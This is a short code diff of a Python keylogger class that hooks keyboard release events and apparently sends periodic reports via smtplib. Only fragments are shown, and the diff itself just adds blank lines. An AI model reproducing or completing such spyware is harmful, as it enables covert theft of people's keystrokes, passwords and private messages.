@@ -2,6 +2,7 @@ import keyboard
 import smtplib
 from threading import Semaphore, Timer
 
+
 class Keylogger:
     def __init__(self, interval):
         self.interval = interval
@@ -45,6 +46,7 @@ class Keylogger:
         keyboard.on_release(callback=self.callback)
         self.report()
         self.semaphore.acquire()
+
 
 if __name__ == "__main__":
     SEND_REPORT_EVERY = 20
